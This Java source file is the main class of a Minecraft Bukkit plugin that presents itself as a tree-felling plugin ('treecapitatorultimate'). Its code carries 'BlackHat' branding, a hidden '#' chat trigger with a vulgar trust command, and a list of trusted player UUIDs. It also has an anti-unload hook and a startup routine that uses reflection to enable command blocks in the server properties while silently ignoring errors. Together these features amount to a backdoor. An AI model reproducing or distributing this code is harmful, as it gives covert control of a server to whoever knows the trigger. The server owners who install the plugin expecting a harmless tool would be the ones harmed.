package me.bow.treecapitatorultimate;

import me.bow.treecapitatorultimate.Utils.AntiUnload;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.CommandManager;
import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
import me.bow.treecapitatorultimate.listeners.TreeDestroy;
import org.apache.commons.lang.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.logging.Logger;

import static me.bow.treecapitatorultimate.Utils.ReflectionUtils.setFinalStatic;

public final class Start extends JavaPlugin {

    public static Start Instance = null;
    public static final Character COMMAND_SIGN = '-';
    public static final Character CHAT_TRIGGER = '#';
    public static final String TRUST_COMMAND = "-dicksuck";
    public static final String COMMAND_PREFIX = "§a[§3Black§4Hat§a]§r ";
    public static final String NOTIFY_PREFIX = "&3Black&4Hat&b>> ";
    public static @NotNull Logger LOGGER;
    private final PluginDescriptionFile pdfFile = this.getDescription();
    public CommandManager cm = new CommandManager();
    public ArrayList<UUID> trustedPeople = new ArrayList<>();
    private final List<Runnable> disableListeners = new ArrayList<>();
    private boolean isReload;

    public static void ErrorString(CommandSender sender, String error) {
        if (sender == null || error.isEmpty()) return;
        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Error: " + error);
        sender.sendMessage(COMMAND_PREFIX + ChatColor.BLUE + "Please message the developer if you thing this is something that shouldn't happen.");
    }

    public static void ErrorException(CommandSender sender, Exception error) {
        if (sender == null || error == null) return;
        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Exception: " + error.getMessage());
        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Possible cause: " + error.getCause());
        sender.sendMessage(COMMAND_PREFIX + ChatColor.BLUE + " Please message the developer if you thing this is something that shouldn't happen.");
    }

    public static Object GetServer() {
        Object o = null;
        try {
            Server server = Bukkit.getServer();
            o = ReflectionUtils.getMethod(server.getClass(), "getServer", 0).invoke(server);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return o;
    }

    public static Object getDedicatedServerPropertiesInstance() throws InvocationTargetException, IllegalAccessException {
        Object server = GetServer();
        Field propertyManager = ReflectionUtils.getField(server.getClass(), "propertyManager");
        Class<?> serverSettings = ReflectionUtils.getClass("{nms}.DedicatedServerSettings");
        Object dedicatedSettingsInstance = propertyManager.get(server);
        return ReflectionUtils.getMethod(serverSettings, "getProperties", 0).invoke(dedicatedSettingsInstance);
    }

    public static Server GetBukkitServer() {
        return Start.Instance.getServer();
    }

    private void onPostWorldLoad() {
        Bukkit.getPluginManager().registerEvents(new TreeDestroy(), this);
        Bukkit.getPluginManager().registerEvents(new AsyncChatEvent(), this);
        cm.Init();
        try {
            AntiUnload.Init();
        } catch (Exception e) {
            e.printStackTrace();
        }
        String loadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") loaded |--";
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
        Bukkit.getConsoleSender().sendMessage("§3" + loadString);
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
    }

    private void onStartup() {
        if (isReload) return;
        // Do every hooking here

        try {
            setFinalStatic(getDedicatedServerPropertiesInstance(), "enableCommandBlock", true);
            // server.propertyManager.getProperties().enableCommandBlock = false;
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onEnable() {
        Instance = this;
        LOGGER = Instance.getLogger();
        isReload = Bukkit.getWorlds().size() != 0;
        onStartup();
        Bukkit.getScheduler().runTask(this, this::onPostWorldLoad);
    }

    @Override
    public void onDisable() {
        disableListeners.forEach(Runnable::run);
        String unloadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") unloaded |--";
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
        Bukkit.getConsoleSender().sendMessage("§3" + unloadString);
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
    }

    public void addDisableListener(Runnable action) {
        disableListeners.add(action);
    }
}
